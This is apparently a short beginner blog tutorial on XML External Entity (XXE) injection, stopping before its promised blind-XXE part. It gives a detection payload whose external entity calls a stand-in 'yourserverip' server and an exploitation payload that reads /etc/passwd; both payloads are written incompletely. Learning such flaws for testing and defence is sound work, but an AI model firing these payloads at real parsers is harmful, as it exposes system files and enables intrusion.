Hi all,

Welcome to my blog of "From basic XXE to blind XXE"

What is XXE?

XXE is a short of XML External Entity, which is a vulnerablity found when misconfiguration XML parser parses enternal entities.
There are two types of XXE:- 1. Basic 2. Blind.

Let's talk about 'basic' type:-

For ex you have this url with a parameter that parses XML data. 'http://myapp.com/somefile.php?xml=<xml_data>'

Now when you provide any xml data, and that data is printing back to the user's browser then you can try basic XXE. First of all for confirming that you have found vulnerability is by using this payload.

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://yourserverip/']`

Now let's understand from Doctype portion. As we define the root element i.e. root, next in the DOCTYPE we define the entity and that entity contains SYSTEM attribute which indicate that the entity is External.

Now when you give this code to the server than that server's XML parser will parse the results and it was miconfigured so it will also process our External entity by **requesting to your server.**
So if you got a new connection in the log file then it is confirmed that you have found XXE.

Now it's time to exploit it.

Here you can give this payload `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd']`
